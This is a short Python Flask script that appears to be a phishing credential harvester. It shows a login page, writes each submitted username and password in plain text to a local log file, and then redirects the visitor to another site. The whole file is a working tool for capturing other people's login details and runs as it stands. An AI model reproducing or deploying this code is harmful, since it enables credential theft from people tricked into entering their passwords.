from flask import Flask, render_template, request, redirect
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    with open("log.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] {username} : {password}\n")
    return redirect("https://example.com")

if __name__ == '__main__':
    app.run(debug=True)
